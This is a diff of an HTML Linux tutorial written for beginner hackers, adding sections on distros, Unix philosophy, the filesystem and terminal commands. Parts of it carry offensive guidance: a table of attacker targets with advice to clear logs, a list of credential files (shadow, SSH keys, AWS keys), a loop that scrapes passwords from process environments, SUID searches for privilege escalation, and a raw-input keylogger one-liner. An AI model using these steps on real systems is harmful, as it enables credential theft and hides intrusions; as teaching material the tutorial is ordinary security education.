-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Update package lists
-sudo apt update
-
-# Upgrade installed packages
-sudo apt upgrade
-sudo apt full-upgrade  # Also handles dependencies
-
-# Install package
-sudo apt install nmap
-
-# Remove package
-sudo apt remove nmap
-sudo apt purge nmap  # Also removes config files
-
-# Search for packages
-apt search network
-
-# Show package info
-apt show nmap
-
-# Fix broken dependencies
-sudo apt --fix-broken install
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #9370db; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Red Hat/CentOS (DNF/YUM)</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Install package
-sudo dnf install nmap
-
-# Update system
-sudo dnf update
-
-# Remove package
-sudo dnf remove nmap
-
-# Search
-dnf search network
-
-# List installed
-dnf list installed
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #9370db; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Arch (pacman)</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Install package
-sudo pacman -S nmap
-
-# Update system
-sudo pacman -Syu
-
-# Remove package
-sudo pacman -R nmap
-
-# Search
-pacman -Ss network
-
-# List installed
-pacman -Q
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #9370db; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Manual Installation from Source</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Download source code
-wget https://example.com/software.tar.gz
-tar -xzf software.tar.gz
-cd software
-
-# Build and install
-./configure
-make
-sudo make install
-</code></pre>
-                    </div>
-
-                    <div style="background: rgba(255,200,0,0.15); padding: 1.5rem; border-radius: 10px; margin: 2rem 0; border-left: 4px solid #ffc800;">
-                        <h4 style="color: #ffc800; margin-bottom: 0.5rem;">🔥 Why This Matters for Hacking</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin: 0;">
-                            Penetration testing tools aren't always pre-installed. Mastering package managers lets you quickly deploy exploits, install custom tools, and compile proof-of-concept code. Speed matters—the faster you can set up your toolkit, the more time you spend actually hacking.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,204,255,0.1); padding: 1.5rem; border-radius: 10px; margin: 2rem 0;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;">🎯 Quick Check</h4>
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0;">
-                            <li>What's the difference between <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">apt remove</code> and <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">apt purge</code>?</li>
-                            <li>Why should you run <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">sudo apt update</code> before installing packages?</li>
-                            <li>What are the three main steps to compile software from source?</li>
-                        </ul>
-                    </div>
+                <div class="card">
+                    <h4>3. All Security Tools Live Here</h4>
+                    <p>Every major hacking tool is built for Linux first:</p>
+                    <ul style="margin-top: 1rem;">
+                        <li>Nmap, Metasploit, Burp Suite</li>
+                        <li>Wireshark, John the Ripper</li>
+                        <li>Hydra, SQLmap, Aircrack-ng</li>
+                        <li>Hashcat, Gobuster, ffuf</li>
+                    </ul>
+                    <p style="margin-top: 1rem;">Many tools don't even work properly on Windows. The security community lives on Linux.</p>
                 </div>
+                <div class="card">
+                    <h4>4. Server Dominance</h4>
+                    <p>When you attack infrastructure, you're attacking Linux:</p>
+                    <ul style="margin-top: 1rem;">
+                        <li>96.3% of top web servers</li>
+                        <li>Most cloud instances (AWS, GCP, Azure)</li>
+                        <li>Enterprise databases</li>
+                        <li>Container platforms (Docker, k8s)</li>
+                    </ul>
+                    <p style="margin-top: 1rem;">Know your target. Your targets run Linux.</p>
+                </div>
+            </div>
 
-                <!-- Topic 7: Shell Scripting Basics -->
-                <div style="background: linear-gradient(135deg, rgba(0,204,255,0.15) 0%, rgba(0,150,200,0.15) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0; border: 2px solid rgba(0,204,255,0.3);">
-                    <h2 style="color: #00ccff; font-size: 1.8rem; margin-bottom: 1.5rem;">🖥️ Topic 7: Bash Scripting — Automating Everything</h2>
-                    
-                    <h3 style="color: #33d4ff; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Your First Script</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code>#!/bin/bash
-# This is a comment
+            <h3>The Linux Distributions (Distros)</h3>
+            <p>Linux isn't one operating system - it's a kernel that many distributions build upon. Each distro packages the kernel with different software and configurations.</p>
 
-echo "Hello, Hacker!"
-echo "Current directory: $(pwd)"
-echo "Current user: $(whoami)"
-</code></pre>
-                    </div>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Make executable and run
-chmod +x script.sh
-./script.sh
-</code></pre>
-                    </div>
+            <div class="card-grid">
+                <div class="card">
+                    <h4>🐲 Kali Linux</h4>
+                    <p><strong>Purpose:</strong> Penetration testing</p>
+                    <p style="margin-top: 1rem;">Pre-loaded with 600+ hacking tools. The most popular distro for security professionals. Based on Debian.</p>
+                    <p style="margin-top: 1rem;"><strong>Use when:</strong> You're doing security work and want everything ready out of the box.</p>
+                </div>
+                <div class="card">
+                    <h4>🦜 Parrot OS</h4>
+                    <p><strong>Purpose:</strong> Security + privacy + development</p>
+                    <p style="margin-top: 1rem;">Similar to Kali but lighter weight with additional privacy tools. Good for daily driving.</p>
+                    <p style="margin-top: 1rem;"><strong>Use when:</strong> You want a hacking distro that's also usable as a daily driver.</p>
+                </div>
+                <div class="card">
+                    <h4>🟠 Ubuntu</h4>
+                    <p><strong>Purpose:</strong> General purpose, beginner-friendly</p>
+                    <p style="margin-top: 1rem;">Most popular desktop distro. Great for learning Linux before jumping to Kali.</p>
+                    <p style="margin-top: 1rem;"><strong>Use when:</strong> Learning Linux fundamentals or need a reliable workstation.</p>
+                </div>
+                <div class="card">
+                    <h4>🏢 Enterprise Distros</h4>
+                    <p><strong>Examples:</strong> RHEL, CentOS, Debian</p>
+                    <p style="margin-top: 1rem;">What servers actually run. Understanding these means understanding your targets.</p>
+                    <p style="margin-top: 1rem;"><strong>Learn these:</strong> To understand real-world server environments.</p>
+                </div>
+            </div>
 
-                    <h3 style="color: #33d4ff; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Variables</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code>#!/bin/bash
+            <div class="warning-box">
+                <h4>Dual Boot vs Virtual Machine vs WSL</h4>
+                <p><strong>Dual Boot:</strong> Install Linux alongside Windows. Best performance, most "real" experience. Reboot required to switch.</p>
+                <p style="margin-top: 0.5rem;"><strong>Virtual Machine:</strong> Run Linux inside Windows using VirtualBox or VMware. Good for learning, can run both simultaneously.</p>
+                <p style="margin-top: 0.5rem;"><strong>WSL (Windows Subsystem for Linux):</strong> Linux terminal inside Windows. Quick and easy, but limited for some security tools.</p>
+                <p style="margin-top: 1rem;"><strong>Recommendation:</strong> Start with VMs for safety and convenience. Move to dual boot or dedicated machine when serious.</p>
+            </div>
+        </section>
 
-# Define variables (no spaces around =)
-name="Alice"
-age=25
+        <section id="philosophy" class="section">
+            <h2 class="section-title">The Unix Philosophy: Understanding How Linux Thinks</h2>
+            <p class="section-intro">Linux was built on specific design principles inherited from Unix that are radically different from Windows. Understanding these principles is key to mastering the system - and to understanding where vulnerabilities come from.</p>
 
-# Use variables
-echo "Name: $name"
-echo "Age: ${age}"
+            <h3>Everything is a File</h3>
+            <p>In Linux, EVERYTHING is represented as a file. This sounds strange, but it's incredibly powerful. Regular files, directories, hardware devices, running processes, network connections - they're all accessed through the filesystem.</p>
 
-# Command substitution
+            <div class="code"># Regular files - obvious
+/home/user/document.txt
+/etc/passwd
+
+# Directories - special files that contain other files
+/home/user/
+/etc/
+
+# Hardware devices - YES, they're files!
+/dev/sda          # Your hard drive (entire disk)
+/dev/sda1         # First partition
+/dev/sda2         # Second partition
+/dev/nvme0n1      # NVMe SSD
+/dev/usb/001      # USB device
+/dev/null         # The "black hole" - discards all data
+/dev/zero         # Infinite source of null bytes
+/dev/random       # Random data (cryptographically secure)
+/dev/urandom      # Random data (faster, less secure)
+
+# Processes - information about running programs!
+/proc/            # Virtual filesystem for process info
+/proc/1234/       # Everything about process 1234
+/proc/1234/cmdline    # Command that started the process
+/proc/1234/environ    # Environment variables
+/proc/1234/fd/        # Open file descriptors
+/proc/cpuinfo     # CPU information
+/proc/meminfo     # Memory information
+/proc/version     # Kernel version
+
+# System information
+/sys/             # Kernel and hardware info
+/sys/class/net/   # Network interface info
+/sys/block/       # Block device info
+
+# Network connections (in some systems)
+/dev/tcp/host/port    # TCP connection to host:port</div>
+
+            <div class="info-box">
+                <h4>Why "Everything is a File" Matters for Hacking</h4>
+                <p>Because everything is a file, you can use the same tools on everything:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><span class="inline-code">cat /dev/sda</span> → Read raw hard drive data</li>
+                    <li><span class="inline-code">cat /proc/1234/maps</span> → See process memory layout</li>
+                    <li><span class="inline-code">echo "data" > /dev/ttyUSB0</span> → Send data to serial device</li>
+                    <li><span class="inline-code">cat /dev/input/event0</span> → Capture keyboard input (keylogger!)</li>
+                    <li><span class="inline-code">cat /proc/1234/fd/0</span> → Read from another process's stdin</li>
+                </ul>
+                <p style="margin-top: 1rem;">This uniformity makes Linux incredibly powerful - and hackable.</p>
+            </div>
+
+            <h3>Do One Thing Well</h3>
+            <p>Unix programs are designed to do ONE thing perfectly, then combine with other programs. This is the complete opposite of Windows applications that try to do everything themselves.</p>
+
+            <div class="code"># Windows approach: One giant program that does everything
+# Example: A "log analyzer" that reads files, parses data, 
+#          filters content, generates reports, sends emails...
+
+# Linux approach: Small tools that chain together
+# Each tool does ONE thing perfectly
+
+# Find all .log files, search for "error", sort them, count unique lines
+find /var/log -name "*.log" | xargs grep "error" | sort | uniq -c
+
+# Each tool does ONE thing:
+# find    → locates files (that's ALL it does)
+# xargs   → passes results as arguments to next command
+# grep    → searches text for patterns
+# sort    → sorts lines alphabetically
+# uniq -c → removes duplicates and counts them
+
+# This pipeline is MORE powerful than any single program!
+# And each tool can be replaced, modified, or extended independently</div>
+
+            <div class="metaphor-box">
+                <h4>🔧 The Power Tool Analogy</h4>
+                <p>Windows is like an all-in-one multi-tool that kind of does everything but does nothing perfectly.</p>
+                <p style="margin-top: 1rem;">Linux is like a professional workshop with a dedicated tool for every job - each one designed by an expert for that specific purpose. A real craftsman uses the right tool for each job and combines them skillfully.</p>
+            </div>
+
+            <h3>Text is the Universal Interface</h3>
+            <p>In Linux, programs communicate through plain text. This makes it trivially easy to chain programs together, inspect what's happening, and manipulate data.</p>
+
+            <div class="code"># Configuration files are text (not binary registry!)
+cat /etc/ssh/sshd_config
+# Human-readable, editable with any text editor
+
+# Program output is text
+ps aux
+# Just text - easy to grep, sort, cut, awk
+
+# Log files are text
+cat /var/log/auth.log
+# Easy to search, analyze, script against
+
+# Contrast with Windows:
+# - Registry is binary (need special tools)
+# - Event logs are binary (need Event Viewer)
+# - Many configs are hidden in obscure locations</div>
+
+            <h3>Silent Success, Vocal Failure</h3>
+            <p>Linux programs follow the convention: if everything works, say nothing. Only speak up when there's a problem.</p>
+
+            <div class="code"># Copy a file
+$ cp file1.txt file2.txt
+$
+# Nothing output = success!
+
+# If there's an error, you'll know:
+$ cp nonexistent.txt file2.txt
+cp: cannot stat 'nonexistent.txt': No such file or directory
+
+# This is intentional!
+# Silent success means you can chain commands confidently
+# If something fails, the error message tells you what went wrong
+
+# Check if command succeeded with $?
+$ cp file1.txt file2.txt
+$ echo $?
+0           # 0 = success
+
+$ cp nonexistent.txt file2.txt
+$ echo $?
+1           # Non-zero = failure</div>
+
+            <h3>Users and Permissions: Everything is Owned</h3>
+            <p>Every file, every process, every resource has an owner and group. The permission system is the foundation of Linux security.</p>
+
+            <div class="code"># Every file has:
+# - An owner (a user)
+# - A group
+# - Permissions for owner, group, and others
+
+$ ls -la /etc/passwd
+-rw-r--r-- 1 root root 2834 Dec 14 10:00 /etc/passwd
+#           │ │    │
+#           │ │    └── Group (root)
+#           │ └────── Owner (root)
+#           └────────  Link count
+
+# Every process runs as a user:
+$ ps aux
+USER       PID  ...  COMMAND
+root         1       /sbin/init
+www-data   842       /usr/sbin/apache2
+mysql     1234       /usr/sbin/mysqld
+
+# Processes can only access what their user can access
+# This is fundamental to privilege separation</div>
+
+            <div class="warning-box">
+                <h4>The Security Implication</h4>
+                <p>This user/permission model means:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>Breaking into a web server as "www-data" doesn't give you root</li>
+                    <li>Privilege escalation is needed to get more access</li>
+                    <li>Misconfigured permissions = security vulnerabilities</li>
+                    <li>SUID binaries run as the file owner (exploit target!)</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="filesystem" class="section">
+            <h2 class="section-title">The Linux Filesystem: Where Everything Lives</h2>
+            <p class="section-intro">Unlike Windows with its C:\, D:\, E:\ drives, Linux has ONE unified filesystem starting from root (/). Every file on the system - regardless of what physical drive it's on - exists somewhere under this single root. This elegant design makes navigation consistent and predictable.</p>
+
+            <div class="metaphor-box">
+                <h4>🌳 The Tree Metaphor</h4>
+                <p>Think of the Linux filesystem as an upside-down tree:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>/</strong> (root) is the trunk - everything grows from here</li>
+                    <li>Directories are branches that split off from the trunk</li>
+                    <li>Files are the leaves at the end of branches</li>
+                </ul>
+                <p style="margin-top: 1rem;">Unlike Windows where each drive is a separate tree (C:\, D:\), Linux is ONE tree. USB drives, network shares, even DVDs get "grafted" onto the tree at mount points. You might plug in a USB and it appears at /media/usb - it becomes part of the same tree!</p>
+            </div>
+
+            <div class="code"># Windows filesystem:
+C:\
+├── Program Files
+├── Users
+└── Windows
+
+D:\
+├── Games
+└── Documents
+
+# Linux filesystem (ONE tree):
+/                          ← Root (everything starts here)
+├── home/                  ← User home directories
+│   ├── alice/
+│   └── bob/
+├── etc/                   ← System configuration
+├── var/                   ← Variable data (logs, databases)
+├── usr/                   ← User programs and data
+├── tmp/                   ← Temporary files
+├── dev/                   ← Device files
+├── proc/                  ← Process information
+├── media/                 ← Mounted removable media
+│   └── usb/               ← Your USB drive appears HERE
+└── mnt/                   ← Temporary mount points</div>
+
+            <h3>Critical Directories You MUST Know</h3>
+            <p>Each directory has a specific purpose defined by the Filesystem Hierarchy Standard (FHS). Knowing what lives where is essential for both navigation and hacking.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Directory</th>
+                        <th>Purpose</th>
+                        <th>Hacker Interest</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">/</span></td>
+                        <td>Root - the top of the filesystem tree</td>
+                        <td>Ultimate goal of privilege escalation. Getting here means owning the system.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/etc</span></td>
+                        <td>System configuration files</td>
+                        <td><strong>GOLDMINE.</strong> Passwords, network config, service configs, cron jobs.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/home</span></td>
+                        <td>User home directories</td>
+                        <td>SSH keys, bash history, personal files, saved credentials.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/root</span></td>
+                        <td>Root user's home directory</td>
+                        <td>Most sensitive data often here. Root's SSH keys, history, notes.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/var</span></td>
+                        <td>Variable data (logs, databases, mail)</td>
+                        <td>Logs reveal attacks and activities. Web roots often here.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/var/log</span></td>
+                        <td>System and application logs</td>
+                        <td>Track your activities or find evidence of others. Clear your tracks!</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/var/www</span></td>
+                        <td>Web server document root (often)</td>
+                        <td>Web application code. Look for config files with database creds!</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/tmp</span></td>
+                        <td>Temporary files (cleared on reboot)</td>
+                        <td><strong>World-writable!</strong> Drop exploits, compile code, pivot from here.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/dev/shm</span></td>
+                        <td>Shared memory (RAM-based)</td>
+                        <td>World-writable, in RAM (fast!), good for staging attacks.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/bin, /sbin</span></td>
+                        <td>Essential system binaries</td>
+                        <td>System commands. Rarely writable. Backdoor targets.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/usr/bin, /usr/sbin</span></td>
+                        <td>User and system programs</td>
+                        <td>Most installed programs live here.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/proc</span></td>
+                        <td>Process and kernel information (virtual)</td>
+                        <td><strong>CRUCIAL.</strong> Running processes, memory maps, kernel parameters.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/sys</span></td>
+                        <td>System and hardware info (virtual)</td>
+                        <td>Hardware details, driver information.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/dev</span></td>
+                        <td>Device files</td>
+                        <td>Direct hardware access. /dev/null, /dev/random useful for attacks.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/opt</span></td>
+                        <td>Optional/third-party software</td>
+                        <td>Custom applications often installed here.</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">/boot</span></td>
+                        <td>Boot loader and kernel</td>
+                        <td>Kernel files. Rarely need to touch unless rootkit territory.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Critical Files Hackers Target</h3>
+            <p>These files contain the most valuable information for attackers:</p>
+
+            <div class="code"># ==================== AUTHENTICATION & USERS ====================
+
+/etc/passwd       # User accounts (readable by everyone!)
+# Format: username:x:UID:GID:comment:home:shell
+# root:x:0:0:root:/root:/bin/bash
+# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+/etc/shadow       # Password hashes (root only - PRIMARY TARGET!)
+# Format: username:hash:last_change:min:max:warn:inactive:expire
+# If you can read this, you can crack passwords!
+
+/etc/group        # Group memberships
+# Shows who belongs to sudo, docker, etc.
+
+/etc/sudoers      # Who can use sudo and how
+# Misconfigurations here = privilege escalation
+
+/etc/sudoers.d/   # Additional sudo rules
+# Check EVERY file in here!
+
+
+# ==================== NETWORK CONFIGURATION ====================
+
+/etc/hosts        # Local DNS overrides (useful for DNS spoofing)
+/etc/resolv.conf  # DNS servers the system uses
+/etc/hostname     # System hostname
+/etc/network/interfaces  # Network interface config (Debian)
+/etc/netplan/*.yaml      # Network config (Ubuntu 18+)
+/etc/sysconfig/network-scripts/  # Network config (RHEL/CentOS)
+
+
+# ==================== SERVICES & APPLICATIONS ====================
+
+/etc/ssh/sshd_config     # SSH server configuration
+# Check: PermitRootLogin, PasswordAuthentication
+
+/etc/ssh/ssh_config      # SSH client configuration
+
+/etc/apache2/            # Apache web server config
+/etc/nginx/              # Nginx web server config
+/etc/mysql/my.cnf        # MySQL configuration
+/etc/postgresql/         # PostgreSQL configuration
+
+/etc/crontab             # Scheduled tasks (check for writable scripts!)
+/etc/cron.d/             # Additional cron jobs
+/etc/cron.daily/         # Daily cron scripts
+/var/spool/cron/crontabs/  # User crontabs
+
+
+# ==================== LOGS (YOUR TRAIL) ====================
+
+/var/log/auth.log        # Authentication attempts (logins, sudo, SSH)
+/var/log/secure          # Same on RHEL/CentOS
+/var/log/syslog          # General system messages
+/var/log/messages        # Same on RHEL/CentOS
+/var/log/apache2/        # Web server access/error logs
+/var/log/nginx/          # Nginx logs
+/var/log/mysql/          # Database logs
+
+
+# ==================== USER-SPECIFIC TREASURES ====================
+
+~/.ssh/                  # SSH directory
+~/.ssh/id_rsa            # Private SSH key (JACKPOT!)
+~/.ssh/authorized_keys   # Who can log in as this user
+~/.ssh/known_hosts       # Servers this user connects to
+
+~/.bash_history          # Command history (passwords in plain text?)
+~/.mysql_history         # MySQL command history
+~/.psql_history          # PostgreSQL history
+
+~/.bashrc, ~/.profile    # Shell configuration
+~/.gnupg/                # GPG keys
+~/.aws/credentials       # AWS access keys ($$!)
+~/.config/               # Application configs</div>
+
+            <h3>The /proc Virtual Filesystem - Live System Intel</h3>
+            <div class="code"># /proc doesn't exist on disk - it's generated by the kernel in real-time
+# Contains information about EVERY running process and the system
+
+# System information:
+/proc/version          # Kernel version
+/proc/cpuinfo          # CPU details
+/proc/meminfo          # Memory usage
+/proc/cmdline          # Boot parameters
+/proc/mounts           # Currently mounted filesystems
+/proc/net/tcp          # Active TCP connections
+/proc/net/udp          # Active UDP connections
+
+# Per-process information (replace 1234 with any PID):
+/proc/1234/cmdline     # Command that started the process
+/proc/1234/environ     # Environment variables (may contain secrets!)
+/proc/1234/exe         # Symlink to the actual executable
+/proc/1234/cwd         # Current working directory
+/proc/1234/fd/         # Open file descriptors
+/proc/1234/maps        # Memory map (useful for exploitation!)
+/proc/1234/status      # Process status (UID, GID, memory)
+
+# Useful commands:
+cat /proc/1234/cmdline | tr '\0' ' '  # See command with args
+ls -la /proc/1234/fd/                  # See all open files
+cat /proc/1234/environ | tr '\0' '\n' # See environment vars</div>
+
+            <div class="info-box">
+                <h4>Pro Tip: Find Sensitive Info in /proc</h4>
+                <div class="code" style="margin-top: 1rem;"># Search all processes for environment variables containing "pass"
+for pid in /proc/[0-9]*; do
+    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -i pass && echo "PID: $pid"
+done
+
+# This might reveal database passwords, API keys, etc!</div>
+            </div>
+        </section>
+
+        <section id="terminal" class="section">
+            <h2 class="section-title">Terminal Mastery: Your Command Center</h2>
+            <p class="section-intro">The terminal is where hackers live. GUIs are for users - the command line is for those who want real power. There's nothing you can do in a GUI that you can't do faster in the terminal, and thousands of things you can do in the terminal that are impossible in a GUI.</p>
+
+            <div class="metaphor-box">
+                <h4>⌨️ Why Terminal > GUI</h4>
+                <p>A GUI is like a menu at a restaurant - you can only order what's listed. A terminal is like having access to the kitchen - you can make ANYTHING, combine ingredients however you want, and create things the menu designer never imagined.</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Speed:</strong> One command does what would take 10 clicks</li>
+                    <li><strong>Precision:</strong> Exact control over every operation</li>
+                    <li><strong>Automation:</strong> Scripts can run commands for you</li>
+                    <li><strong>Remote access:</strong> Works over SSH when there's no GUI</li>
+                    <li><strong>Power:</strong> Many operations only exist in terminal</li>
+                </ul>
+            </div>
+
+            <h3>Basic Navigation Commands</h3>
+            <div class="code"># ==================== WHERE AM I? ====================
+
+pwd                        # Print Working Directory
+# Output: /home/hacker
+# Always know your location!
+
+# ==================== WHAT'S HERE? ====================
+
+ls                         # List files (basic)
+ls -l                      # Long format (permissions, owner, size, date)
+ls -a                      # Show hidden files (starting with .)
+ls -la                     # Combine: all files, long format
+ls -lah                    # Same but human-readable sizes (K, M, G)
+ls -lt                     # Sort by modification time
+ls -ltr                    # Sort by time, reversed (oldest first)
+ls -R                      # Recursive (show subdirectories)
+
+# Example output of ls -la:
+# drwxr-xr-x 2 hacker hacker 4096 Dec 14 10:00 documents/
+# -rw-r--r-- 1 hacker hacker  182 Dec 14 09:30 notes.txt
+# -rwx------ 1 hacker hacker  512 Dec 14 08:00 secret_script.sh
+
+# ==================== MOVE AROUND ====================
+
+cd /etc                    # Go to absolute path
+cd documents               # Go to relative path (inside current dir)
+cd ..                      # Go up one level (parent directory)
+cd ../..                   # Go up two levels
+cd ~                       # Go to your home directory (/home/username)
+cd                         # Same as cd ~
+cd -                       # Go back to previous directory (toggle)
+
+# Pro tip: Use Tab for autocomplete!
+# cd /etc/apa[Tab] → cd /etc/apache2/
+
+# ==================== VIEW FILE CONTENTS ====================
+
+cat file.txt               # Print entire file at once
+cat file1.txt file2.txt    # Concatenate multiple files
+cat -n file.txt            # Show line numbers
+
+head file.txt              # First 10 lines
+head -20 file.txt          # First 20 lines
+head -n 5 file.txt         # First 5 lines
+
+tail file.txt              # Last 10 lines
+tail -20 file.txt          # Last 20 lines
+tail -f /var/log/auth.log  # Follow file in real-time (VERY useful for logs!)
+
+less file.txt              # Scrollable view
+# Navigation in less:
+# Space = page down, b = page up
+# / = search forward, ? = search backward
+# n = next match, N = previous match
+# g = go to start, G = go to end
+# q = quit
+
+more file.txt              # Simpler pager (less is more!)
+
+# ==================== FILE INFORMATION ====================
+
+file document.pdf          # Determine file type
+stat file.txt              # Detailed file information
+wc file.txt                # Word, line, character count
+wc -l file.txt             # Line count only</div>
+
+            <h3>File Manipulation - Creating, Copying, Moving, Deleting</h3>
+            <div class="code"># ==================== CREATE ====================
+
+touch newfile.txt              # Create empty file (or update timestamp)
+touch file1.txt file2.txt      # Create multiple files
+
+mkdir newfolder                # Create directory
+mkdir -p a/b/c/d               # Create nested directories (parents too)
+mkdir -p project/{src,docs,tests}  # Create multiple subdirectories
+
+# Create file with content:
+echo "Hello World" > file.txt  # Write to file (overwrites!)
+echo "More text" >> file.txt   # Append to file
+
+cat > file.txt << EOF          # Multi-line input (heredoc)
+Line 1
+Line 2
+Line 3
+EOF
+
+# ==================== COPY ====================
+
+cp file.txt backup.txt         # Copy file
+cp file.txt /tmp/              # Copy to directory
+cp -r folder/ backup/          # Copy directory recursively (-r is essential!)
+cp -a folder/ backup/          # Archive mode (preserves permissions, timestamps)
+cp -i file.txt backup.txt      # Interactive (ask before overwriting)
+cp -v file.txt backup.txt      # Verbose (show what's happening)
+
+# ==================== MOVE / RENAME ====================
+
+mv old.txt new.txt             # Rename file
+mv file.txt /tmp/              # Move to different location
+mv file.txt /tmp/newname.txt   # Move AND rename
+mv -i old.txt new.txt          # Interactive (ask before overwriting)
+mv folder/ /tmp/               # Move entire directory
+
+# ==================== DELETE (CAREFUL - NO RECYCLE BIN!) ====================
+
+rm file.txt                    # Delete file (GONE FOREVER)
+rm -i file.txt                 # Interactive (ask first)
+rm -r folder/                  # Delete directory recursively
+rm -rf folder/                 # Force delete, no confirmation (DANGEROUS!)
+rm -rf /                       # DON'T DO THIS! (Deletes everything)
+
+rmdir emptyfolder/             # Delete only if empty (safer)
+
+# Pro tip: Use trash-cli for recoverable deletions
+# sudo apt install trash-cli
+# trash file.txt               # Move to trash instead of delete</div>
+
+            <h3>Finding Files - Where Is That Thing?</h3>
+            <div class="code"># ==================== FIND - The Power Tool ====================
+
+find /path -name "filename"    # Find by name
+find / -name "passwd"          # Find passwd anywhere
+find / -name "*.conf"          # Find all .conf files
+find / -iname "*.conf"         # Case-insensitive
+
+find /home -user root          # Find files owned by root
+find /home -group admin        # Find files owned by group admin
+
+find / -type f                 # Find only files
+find / -type d                 # Find only directories
+find / -type l                 # Find only symlinks
+
+find / -size +100M             # Files larger than 100MB
+find / -size -1k               # Files smaller than 1KB
+
+find / -mtime -1               # Modified in last 24 hours
+find / -mtime +30              # Modified more than 30 days ago
+find / -mmin -60               # Modified in last 60 minutes
+
+find / -perm -4000             # SUID files (PRIVILEGE ESCALATION!)
+find / -perm -2000             # SGID files
+find / -perm -o+w              # World-writable files
+
+find / -writable               # Files you can write to
+find / -readable               # Files you can read
+
+# Combine with actions:
+find / -name "*.log" -delete   # Find and delete
+find / -name "*.sh" -exec chmod +x {} \;  # Find and execute command
+
+# Redirect errors (permission denied spam):
+find / -name "passwd" 2>/dev/null
+
+# ==================== LOCATE - Fast Search ====================
+
+locate filename                # Instant search (uses database)
+locate -i filename             # Case-insensitive
+sudo updatedb                  # Update the database
+
+# locate is fast but may miss recent files (database updated periodically)
+
+# ==================== WHICH / WHEREIS / TYPE ====================
+
+which python                   # Find command location
+which -a python                # Find ALL locations
+
+whereis python                 # Find binary, source, man pages
+type python                    # What type of command is it?</div>
+
+            <h3>Text Processing - The Hacker's Swiss Army Knife</h3>
+            <div class="code"># ==================== GREP - Search Inside Files (ESSENTIAL!) ====================
+
+grep "password" file.txt               # Find lines containing "password"
+grep -i "password" file.txt            # Case-insensitive
+grep -r "password" /etc/               # Recursive search through directory
+grep -l "password" *.txt               # List only filenames that match
+grep -n "password" file.txt            # Show line numbers
+grep -c "password" file.txt            # Count matches
+grep -v "ignore" file.txt              # Invert: lines NOT matching
+grep -A 3 "error" file.txt             # Show 3 lines After match
+grep -B 3 "error" file.txt             # Show 3 lines Before match
+grep -C 3 "error" file.txt             # Show 3 lines Context (before and after)
+
+# Regular expressions with grep:
+grep -E "user|pass" file.txt           # Extended regex: OR
+grep "^root" /etc/passwd               # Lines starting with "root"
+grep "bash$" /etc/passwd               # Lines ending with "bash"
+grep -E "192\.168\.[0-9]+\.[0-9]+" file.txt  # IP addresses
+
+# Practical hacker uses:
+grep -r "password" /var/www/           # Find passwords in web code
